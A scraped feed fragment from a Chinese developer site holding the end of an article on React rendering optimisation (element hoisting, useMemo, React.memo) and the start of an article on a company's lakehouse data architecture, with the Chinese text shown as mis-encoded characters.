    <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>
            Menu Render Times: {menuRenderTime++}
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount((c) =&gt; c + 1)}&gt;
                Menu Count: {count}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span>
    );
}

<span class="hljs-keyword">const</span> menuElement = <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Menu</span> /&gt;</span></span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            {menuElement}
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount((c) =&gt; c + 1)}&gt;
                Count: {count}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<p><strong>æ‰€ä»¥å¦‚æœè¦è®ºå¦‚ä½•ä¼˜åŒ– React çš„æ¸²æŸ“æ€§èƒ½ï¼Œå¾ˆå¤§çš„ä¸€ä¸ªæ–¹å‘å…¶å®å°±æ˜¯å‡å°‘èŠ‚ç‚¹çš„æ— æ•ˆåˆ›å»º</strong>ï¼Œè¿™ä¸€æ–¹é¢å‡å°‘äº†createElementçš„è°ƒç”¨æ¬¡æ•°ï¼Œ å¦ä¸€æ–¹é¢å¤§å¤§è§„é¿äº†æ— æ•ˆæ¸²æŸ“ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼ä¸ºä»€ä¹ˆå¹¶æ²¡æœ‰è¢«å¹¿æ³›æ¨å¹¿å‘¢ï¼Ÿä¸»è¦æ˜¯å› ä¸ºå…¶å¯ç»´æŠ¤æ€§ä¸é«˜ï¼Œå› ä¸ºä½ éœ€è¦æŠŠå…·ä½“æŸå‡ ä¸ªèŠ‚ç‚¹å•ç‹¬æå‡ºå»å£°æ˜ï¼Œ è¿™è®©èŠ‚ç‚¹æ¸²æŸ“è„±ç¦»äº†å¸¸è§„çš„èŠ‚ç‚¹æµï¼Œè€Œç­‰åˆ°ä½ çš„ä¸šåŠ¡å˜å¾—å¤æ‚ï¼Œä½ å¯èƒ½å¾ˆéš¾é¿å…éœ€è¦ä¼ é€’ä¸€äº› props ç»™è¯¥ç»„ä»¶ï¼Œè¿™æ—¶å€™ä½ å°±éœ€è¦æŠŠè¿™ä¸ªç»„ä»¶æå‡åˆ°çˆ¶ç»„ä»¶ä¸­ï¼Œ é‚£ä»£ç æ”¹èµ·æ¥å°±å˜å¾—éå¸¸çš„éº»çƒ¦ã€‚</p>
<p><strong>å¦å¤–ä¸€ç§æ–¹å¼æ˜¯ä¸æŠŠMenuæåˆ°Appä¹‹å¤–ï¼Œè€Œæ˜¯æ”¾åˆ°useMemoä¸­</strong>ï¼Œè¿™ä¹Ÿæ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯è¿™ä¼šå¼•å…¥useMemoçš„è®¡ç®—æˆæœ¬ï¼Œä½ å¯èƒ½éœ€è¦å»è¯„ä¼°è¿™ä¸ªæˆæœ¬æ˜¯å¦å€¼å¾—ï¼Œ è€Œå´è™½ç„¶æ–¹ä¾¿äº†ä¸€äº›ï¼Œä½†æ˜¯ä»ç„¶ç»´æŠ¤èµ·æ¥æ¯”è¾ƒéº»çƒ¦ã€‚</p>
<p>ä¸è¿‡ React æä¾›äº†ä¸€ç§æ›´ç¬¦åˆä½¿ç”¨ä¹ æƒ¯çš„ä¼˜åŒ–æ–¹å¼ï¼Œé‚£å°±æ˜¯<strong>React.memo</strong>ï¼Œè¿™ä¸ª API çš„ä½œç”¨å°±æ˜¯è®©ç»„ä»¶å˜æˆä¸€ä¸ªçº¯ç»„ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœç»„ä»¶çš„propsæ²¡æœ‰å˜åŒ–ï¼Œ é‚£ä¹ˆå°±ä¸ä¼šé‡æ–°æ¸²æŸ“ã€‚</p>
<h4 data-id="heading-8">React.memo</h4>
<p>React.memoå…¶å®å°±æ˜¯å‡½æ•°ç»„ä»¶ç‰ˆçš„PureComponentï¼Œå½“ä½ ä½¿ç”¨memoæ¥å®šä¹‰ä¸€ä¸ªç»„ä»¶çš„æ—¶å€™ï¼Œmemoä¼šåœ¨å‘ç°ç»„ä»¶éœ€è¦é‡æ–°æ¸²æŸ“çš„æ—¶å€™ï¼Œ å…ˆå» check ä¸€éç»„ä»¶çš„propsæ˜¯å¦å˜åŒ–ï¼Œä»–çš„é»˜è®¤ check ç®—æ³•æ˜¯shallowEqualï¼Œä¹Ÿå°±æ˜¯åªæ¯”è¾ƒpropså¯¹è±¡çš„ç›´æ¥å±æ€§ï¼Œå¹¶ä¸”ç›´æ¥===æ¥å¯¹æ¯”ï¼Œ å¦‚æœ prop æ˜¯å¯¹è±¡ï¼Œä»–ä¹Ÿæ˜¯ç›´æ¥å¯¹æ¯”å¯¹è±¡çš„å¼•ç”¨æ˜¯å¦ç›¸åŒï¼Œæ‰€ä»¥æ€»ä½“æ¥è¯´æ¯”è¾ƒç®—æ³•çš„æˆæœ¬æ˜¯å¾ˆä½çš„ï¼Œå¤§æ¦‚ç‡æ¯”ç»„ä»¶é‡æ–°æ¸²æŸ“è¦ä½å¾ˆå¤šã€‚</p>
<p>React çš„ issue é‡Œä¹Ÿæœ‰ä¸€ä¸ªè®¨è®º React æ˜¯å¦åº”è¯¥é»˜è®¤å¼€å¯memoçš„å¸–å­ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šç”¨æˆ·å…¶æœŸæœ›å¯ä»¥é»˜è®¤å¼€å¯memoçš„ï¼Œ å› ä¸ºå‡ ä¹ç™¾åˆ†ä¹‹ 95%ä»¥ä¸Šçš„æƒ…å†µï¼ˆç”šè‡³å¯èƒ½æ›´é«˜ï¼‰ï¼Œä½ æŠŠæ‰€æœ‰ç»„ä»¶éƒ½å¼€å¯memoæ˜¯æ²¡æœ‰ä»€ä¹ˆè´Ÿé¢å½±å“çš„ï¼Œå´å¯ä»¥è§„é¿å¤§éƒ¨åˆ†çš„æ— æ•ˆæ¸²æŸ“ï¼Œ æ˜¯å±äºä½•ä¹è€Œä¸ä¸ºçš„äº‹æƒ…ã€‚æœ‰å…´è¶£çš„åŒå­¦å¯ä»¥å»è¿™ä¸ª<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Freact%2Fissues%2F14463" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Freact%2Fissues%2F14463">issue</a>çœ‹çœ‹å¤§ä½¬ä»¬çš„è®¨è®ºã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹ä¸ºä»€ä¹ˆ React å®˜æ–¹ä¸è€ƒè™‘é»˜è®¤å¼€å¯memoçš„åŸå› ï¼š</p>
<ul>
<li>å…¼å®¹è€ä»£ç ï¼ŒReact çš„å‘å‰å…¼å®¹æ˜¯å‡ºäº†åçš„ç‰›ï¼Œç”šè‡³ 5-6 å¹´å‰çš„ä»£ç ç°åœ¨å‡çº§åˆ° 18 å¤§æ¦‚ç‡è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œåªæ˜¯å¤šäº†å¾ˆå¤š warningï¼Œ è€Œå› ä¸ºè€ƒè™‘é»˜è®¤å¼€å¯memoæ˜¯å¯¹ React çš„æ¸²æŸ“æœºåˆ¶çš„ä¸€ç§ç ´åæ€§æ›´æ–°ï¼Œå³ä¾¿å¤§éƒ¨åˆ†çš„ä»£ç ä¸ä¼šå—å½±å“ï¼Œä½†æ˜¯å‡ºäºå…¼å®¹æ€§çš„è€ƒè™‘ï¼Œä¹Ÿä¸ä¼šé»˜è®¤å¼€å¯</li>
<li>æœ‰ä¸€äº›æç«¯çš„ Case å¯èƒ½ä¼šå› ä¸ºåŠ äº†memoæ— æ³•æ­£å¸¸å·¥ä½œï¼Œæ¯”å¦‚åœ¨ä¸€äº›ä½¿ç”¨å“åº”å¼ç¼–ç¨‹æ¥ç»´æŠ¤ç»„ä»¶çŠ¶æ€çš„æƒ…å†µï¼Œå½“ç„¶æˆ‘å¹¶æ²¡æœ‰ç¢°åˆ°è¿‡ç±»ä¼¼ caseï¼Œ ä¸€æ–¹é¢æˆ‘ä¸å–œæ¬¢åœ¨ React ä¸­ç”¨å“åº”å¼ï¼Œå¦å¤–ä¸€æ–¹é¢å³ä¾¿æ˜¯å“åº”å¼ç¼–ç¨‹ä¹Ÿéœ€è¦ä¸€äº›æç«¯çš„æƒ…å†µæ‰ä¼šå‡ºç°ã€‚</li>
<li>ä¸å¼€å¯memoæ€§èƒ½ä¹Ÿæ²¡æœ‰é‚£ä¹ˆå·®ï¼Œè¿˜æ˜¯é‚£å¥è¯ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œå³ä¾¿ä½ ä¸åšä»»ä½•ä¼˜åŒ–ï¼ŒReact çš„æ€§èƒ½ä¹Ÿæ˜¯è¶³å¤Ÿçš„ï¼Œå¦‚æœä½ å‘ç°å“ªé‡Œæ€§èƒ½æœ‰é—®é¢˜ï¼Œ ä½ å†æ¸è¿›å¼åœ°å»åŠ memoå°±å¯ä»¥ï¼Œè¿™å±äº React åœ°ä¸€ç§è®¾è®¡å“²å­¦å§ï¼Œä½ å¯ä»¥ä¸è®¤å¯ï¼Œä½†ä¹Ÿä¸èƒ½å¦è®¤ä»–ä¹Ÿæœ‰æ­£ç¡®åœ°åœ°æ–¹ã€‚</li>
</ul>
<p>å…³äº memo çš„ä½¿ç”¨æˆ‘å°±ä¸å•ç‹¬ä¸¾ä¾‹äº†ï¼Œç›¸ä¿¡å¤§å®¶éƒ½ç”¨åˆ°è¿‡ï¼Œmemo å…¶å®å°±æ˜¯ç»„ä»¶çº§åˆ«çš„ useMemoï¼Œè€Œ props ä¸­çš„æ‰€æœ‰å±æ€§å°±æ˜¯ useMemo ä¸­ç¬¬äºŒä¸ªå‚æ•°ä¸­çš„æ•°ç»„ï¼Œ memo åªè¦å‘ç° props æ²¡æœ‰å˜åŒ–ï¼Œå°±ä¼šç›´æ¥è¿”å›ä¹‹å‰å·²ç»åˆ›å»ºè¿‡çš„ Elementï¼Œä¹Ÿå°±ç¬¦åˆäº†æˆ‘ä¸Šä¸€èŠ‚ä¸­æåˆ°çš„ä¼˜åŒ–æ–¹å¼ï¼Œå´åˆæ²¡æœ‰ä»£ç éš¾ä»¥ç»´æŠ¤çš„é—®é¢˜ã€‚</p>
<p><strong>æ³¨æ„ï¼š</strong> memoå¹¶æ²¡æœ‰è§„é¿æ¸²æŸ“ï¼Œè€Œæ˜¯æŠŠé‡å¤æ¸²æŸ“è¿™ä»¶äº‹äº¤ç»™äº†memoè¿”å›çš„HOCï¼Œè€Œè¿™ä¸ªç»„ä»¶åªåšäº†ä¸€ä»¶äº‹ï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­propsæ˜¯å¦å˜åŒ–ï¼Œå¦‚æœæ²¡æœ‰å˜åŒ–å°±è¿”å›ä»–cacheçš„èŠ‚ç‚¹ï¼Œ å†…éƒ¨å®ç°æœ‰ç‚¹ç±»ä¼¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">memo</span>(<span class="hljs-params">Comp</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">MemoHOC</span>(...props) {
        <span class="hljs-keyword">const</span> element = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Comp</span> {<span class="hljs-attr">...props</span>} /&gt;</span></span>
        }, [...<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(props)]) <span class="hljs-comment">// å½“ç„¶è¿™é‡Œéœ€è¦æ’åºä¸€ä¸‹</span>

        <span class="hljs-keyword">return</span> element
    }
}
</code></pre>
<h2 data-id="heading-9">ç»“è¯­</h2>
<p>ä¸€ä¸ªè¯æ¦‚æ‹¬å°±æ˜¯<strong>æœºåˆ¶</strong>ï¼ŒReactè®¾è®¡å¦‚æ­¤ï¼Œä»–çš„æ›´æ–°å°±æ˜¯ç»„ä»¶æ ‘çº§åˆ«çš„ï¼Œå¦‚æœä½ æ—¶ä¸æ—¶æ‰“å¼€Profilerçœ‹çœ‹ï¼Œä½ ä¼šå‘ç°å¾ˆå¤šæ—¶å€™ä½ çš„ä»£ç å¤§æ¦‚ç‡å°±æ˜¯åªæœ‰å‡ ä¸ªå¶å­èŠ‚ç‚¹åœ¨æ›´æ–°ï¼Œåªè¦ä¸çŠ¯ç±»ä¼¼é¢‘ç¹æ›´æ–°Contextè¿™æ ·çš„åŸºæœ¬é”™è¯¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ•°ä»“-æ¹–ä»“-æ¹–æµï¼ŒäººåŠ›å®¶åŸºäºé˜¿é‡Œäº‘ OpenLake æ¶æ„æ¼”è¿›ä¸æ€è€ƒ]]></title>    <link>https://juejin.cn/post/7603195960254398464</link>    <guid>https://juejin.cn/post/7603195960254398464</guid>    <pubDate>2026-02-05T10:42:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254398464" data-draft-id="7602936997176033332" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ•°ä»“-æ¹–ä»“-æ¹–æµï¼ŒäººåŠ›å®¶åŸºäºé˜¿é‡Œäº‘ OpenLake æ¶æ„æ¼”è¿›ä¸æ€è€ƒ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-02-05T10:42:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/2414974667341287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ•°ä»“-æ¹–ä»“-æ¹–æµï¼ŒäººåŠ›å®¶åŸºäºé˜¿é‡Œäº‘ OpenLake æ¶æ„æ¼”è¿›ä¸æ€è€ƒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2414974667341287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:42:33.000Z" title="Thu Feb 05 2026 10:42:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»23åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šçŸ³ç‰é˜³ï¼ŒèŠ±åï¼šThorneï¼ŒÂ Flink-CDCÂ Contributorï¼ŒäººåŠ›å®¶èµ„æ·±æ•°æ®å·¥ç¨‹å¸ˆ</p>
<h2 data-id="heading-0">ä¸€ã€ç®€ä»‹</h2>
<p>ä»åŠ±å®¶ç½‘ç»œç§‘æŠ€ï¼ˆæ­å·ï¼‰æœ‰é™å…¬å¸Â ç®€ç§°â€œäººåŠ›å®¶â€æˆç«‹äº2018Â å¹´ï¼Œç”±é’‰é’‰ä¸äººåŠ›çªå…±åŒæŠ•èµ„æˆç«‹ï¼Œæ˜¯ä¸€å®¶æŠ€æœ¯é¢†å…ˆçš„äººåŠ›èµ„æºæ•°å­—åŒ–ç§‘æŠ€å…¬å¸ã€‚</p>
<p>åŸºäºä¸­å›½ä¼ä¸šååŒåŠå…¬å æœ‰ç‡æ’åç¬¬ä¸€çš„é’‰é’‰å¹³å°ï¼Œæä¾›ä¸€ä½“åŒ–äººåŠ›èµ„æºæ•°å­—åŒ–è§£å†³æ–¹æ¡ˆå’Œä¸€ç«™å¼äººåŠ›èµ„æºç®¡ç†æœåŠ¡ï¼ŒåŠ é€Ÿå¯¹ä¸­å›½ä¼ä¸šäººåŠ›èµ„æœ¬æœåŠ¡çš„æ•°å­—åŒ–èµ‹èƒ½ï¼Œå®ç°äººåŠ›èµ„æœ¬ç®¡ç†çš„æ–°å·¥ä½œæ–¹å¼ï¼Œå…¬å¸çš„ä½¿å‘½æ„¿æ™¯æ˜¯Â â€œæ™®æƒ äººåŠ›â€Â â€œè®©HRè¿›å…¥æ•°æ™ºåŒ–æ—¶ä»£â€ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b2f3aad38ae9448c9d031139b34cf2dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=MmU6dcRo6WiaE1i%2BvK08f46vVvs%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">1.1ã€æ•°ä»“åˆæœŸï¼š</h3>
<p>åœ¨æ—©æœŸï¼ŒäººåŠ›å®¶çš„å†…éƒ¨æ•°æ®ä»“åº“ä¸»è¦ä¾æ‰˜äºMaxComputeè¿™ä¸€å¼ºå¤§çš„æ•°æ®ä»“åº“è½¯ä»¶è¿›è¡Œæ•°æ®å¤„ç†ä¸åˆ†æå’ŒDataWorksä½œä¸ºä¸€ç«™å¼æ•°æ®å¼€å‘å¹³å°ï¼Œå…¶ä¸­DataWorksçš„æ•°æ®é›†æˆä½œä¸ºETLè½¯ä»¶ï¼Œå®æ—¶è®¡ç®—é‡‡ç”¨FlinkÂ VVRï¼ˆVervericaÂ Runtimeï¼‰Â ä½œä¸ºè®¡ç®—å¼•æ“ï¼Œç¦»çº¿/å®æ—¶è®¡ç®—æ¶µç›–äº†è´¢åŠ¡ã€è¿è¥ã€APPã€CRMã€GTMã€CSç­‰å¤šä¸ªä¸šåŠ¡åŸŸã€‚éšç€å¯¹å®æ—¶æ•°æ®åˆ†æéœ€æ±‚çš„æ—¥ç›Šå¢é•¿ï¼Œæ—©æœŸæ•°ä»“å­˜åœ¨ä¸€äº›å¼Šç«¯ã€‚åŒ…æ‹¬ï¼šæ•°æ®å‰²è£‚ï¼ˆåŒä¸€ä»½æ•°æ®å¯èƒ½å­˜å‚¨åœ¨ä¸åŒåœ°æ–¹ï¼‰ã€æ•°æ®æ–°é²œåº¦ä½ï¼ˆT+1ï¼‰ã€æ•°æ®ä¿®å¤éš¾åº¦å¤§/æˆæœ¬å¤§ã€æ•°æ®æ ¼å¼ä¸å¤Ÿå¼€æ”¾ç­‰é—®é¢˜é¢‘å‘ã€‚</p>
<h3 data-id="heading-2">1.2ã€æ•°ä»“åŠ é€Ÿæˆé•¿ï¼š</h3>
<p>éšç€æ–°ä¸šåŠ¡çº¿çš„æ‰©å±•ï¼ŒåŸæœ‰çš„å¤§æ•°æ®æŠ€æœ¯æ ˆå·²ç»ä¸èƒ½æ»¡è¶³æ–°äº§å“ç¿äººäº‹ï¼ˆHCMï¼‰å¯¹OLAPæé€Ÿåˆ†æçš„éœ€æ±‚ï¼Œå…¬å¸éœ€è¦ä¸€ä¸ªèƒ½æ‰¿è½½æé€Ÿåˆ†æè½¯ä»¶çš„å¤–éƒ¨å®¢æˆ·çš„å®æ—¶æ•°ä»“ï¼Œæœ€ç»ˆStarRockså‡­å€Ÿå…¶MPPæ¶æ„+Pipelineå¼•æ“+CBOä¼˜åŒ–å™¨+Lakehouseæ¶æ„çš„ä¼˜ç§€è¡¨ç°è¢«é‡‡çº³ã€‚ä½¿ç”¨StarRocksæ¥æ„å»ºå®æ—¶æ•°ä»“å¸®åŠ©ç”¨æˆ·åŠ é€ŸOLAPå’Œå¤æ‚ä¸šåŠ¡é€»è¾‘çš„æ„å»ºï¼Œå…¶ä¸­ä½¿ç”¨viewÂ tableÂ å»ºæ¨¡ï¼Œå¼‚æ­¥ç‰©åŒ–è§†å›¾ã€ç”Ÿæˆåˆ—æ¥åŠ é€ŸOlAPæŸ¥è¯¢ã€‚</p>
<h3 data-id="heading-3">1.3ã€æ¹–ä»“æœ€ç»ˆå½¢æ€ï¼š</h3>
<p>ç»è¿‡è¿‘ä¸€å¹´çš„ä¸æ‡ˆåŠªåŠ›ï¼Œæˆ‘ä»¬å…¬å¸å·²ç»æ„å»ºäº†ä¸€ä¸ªå…·å¤‡å¯æŒç»­æ€§ã€å¯æ‰©å±•æ€§å’Œçµæ´»æ€§çš„æ¹–ä»“ç³»ç»Ÿï¼Œä¸ºæœªæ¥æ•°æ®æŠ€æœ¯çš„å‘å±•å¥ å®šäº†åšå®çš„åŸºç¡€ã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬çš„æ¹–ä»“ç³»ç»Ÿé‡‡ç”¨äº†å¼€æ”¾çš„æ•°æ®æ ¼å¼ï¼Œè¿™ä½¿å¾—æ•°æ®ä¸å†å—åˆ¶äºç‰¹å®šçš„è®¡ç®—å¼•æ“æˆ–äº‘æœåŠ¡æä¾›å•†ã€‚è¿™ç§å¼€æ”¾æ€§ä¸ºç”¨æˆ·æä¾›äº†æå¤§çš„è‡ªç”±åº¦ï¼Œå¯ä»¥æ ¹æ®å®é™…éœ€æ±‚çµæ´»é€‰æ‹©æœ€é€‚åˆçš„è®¡ç®—å·¥å…·å’ŒæŠ€æœ¯æ ˆã€‚ä¾‹å¦‚ï¼Œæ— è®ºæ˜¯ApacheÂ Sparkã€Flinkè¿˜æ˜¯StarRocksï¼Œéƒ½å¯ä»¥æ— ç¼åœ°ä¸æˆ‘ä»¬çš„æ¹–ä»“ç³»ç»Ÿé›†æˆï¼Œä»è€Œå®ç°é«˜æ•ˆçš„æ•°æ®å¤„ç†å’Œåˆ†æã€‚</p>
